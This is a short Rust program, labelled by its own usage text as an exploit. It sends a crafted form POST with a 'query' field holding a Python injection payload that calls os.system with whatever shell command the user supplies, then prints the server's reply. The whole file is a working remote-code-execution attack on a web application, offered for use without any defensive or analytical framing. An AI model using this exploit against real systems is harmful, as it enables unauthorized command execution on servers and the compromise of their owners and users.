use std::env;
use reqwest::blocking::Client;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args: Vec<String> = env::args().collect();
    if args.contains(&String::from("-h")) {
        println!("Usage: exploit <url> <command>");
        std::process::exit(1);
    }
    let url = &args[1];
    let command = &args[2..].join(" ");
    let code = format!("}}\')(__import__(\'os\').system(\'{}\'))#", command);
    let data = format!("engine=Amazon&query={}", code);
    let client = Client::new();
    let res = client.post(url)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .body(data)
        .send()?;
    println!("{}", res.text()?);
    Ok(())
}
